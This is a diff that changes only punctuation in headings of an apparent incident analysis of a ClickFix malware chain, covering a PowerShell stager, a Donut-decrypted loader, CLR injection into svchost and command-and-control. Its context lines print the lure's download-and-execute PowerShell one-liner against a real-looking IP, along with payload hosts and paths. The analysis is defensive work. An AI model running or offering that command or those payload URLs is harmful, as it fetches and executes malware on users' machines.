@@ -40,7 +40,7 @@ User pastes ClickFix PowerShell command
   → C2 91.92.243.161:3038
 ```
 
-## Initial Access — ClickFix
+## Initial Access - ClickFix
 
 Fake verification workflow instructed the user to open PowerShell and execute:
 
@@ -48,9 +48,9 @@ Fake verification workflow instructed the user to open PowerShell and execute:
 iex(irm http://158.94.211.77/?sid=<random>)
 ```
 
-The response is a PowerShell stager, not the final payload. User execution is the only initial access mechanism — no exploit required.
+The response is a PowerShell stager, not the final payload. User execution is the only initial access mechanism - no exploit required.
 
-## Stage 1 — PowerShell Shellcode Runner
+## Stage 1 - PowerShell Shellcode Runner
 
 Stager pivots to payload host `158.94.211.76` and retrieves:
 
@@ -72,7 +72,7 @@ Marshal.Copy
 CreateThread
 ```
 
-## Stage 2 — Donut → mod_s_enterprise
+## Stage 2 - Donut → mod_s_enterprise
 
 Donut decryption of `s_enterprise` yields native PE `mod_s_enterprise`.
 
@@ -116,7 +116,7 @@ enterprise/student_s.bin
 158.94.211.76/enterprise/student_s.bin
 ```
 
-## Stage 3 — student_S.bin
+## Stage 3 - student_S.bin
 
 Retrieved PE:
 
@@ -149,7 +149,7 @@ rabin2 -zz student_S.bin | grep -i sub00
 
 Single `.data` reference. Runtime correlation appears in Stage 4.
 
-## Stage 4 — Injection and CLR Load
+## Stage 4 - Injection and CLR Load
 
 First visible execution remains inside PowerShell. Defender records in-memory CLR assembly:
 
@@ -188,7 +188,7 @@ Name matches the `student_S.bin` `.data` string.
 
 Strong name correlation; mechanical link not fully confirmed. Manual CLR hosting (`mscoree.dll` / `CLRCreateInstance`) is the leading theory and was not confirmed from the import table captured in this pass.
 
-## Stage 5 — Post-Injection Behavior
+## Stage 5 - Post-Injection Behavior
 
 `BluetoothUserService` is a convenient legitimate `svchost` residence, not Bluetooth-specific tradecraft.
 
@@ -202,7 +202,7 @@ Defender telemetry from the injected process:
 
 Working picture only: re-validate process attribution and event rows from `DeviceNetworkEvents` / `DeviceEvents` before customer-facing claims.
 
-## Stage 6 — Command and Control
+## Stage 6 - Command and Control
 
 Post-execution infrastructure (not used for initial delivery):
 
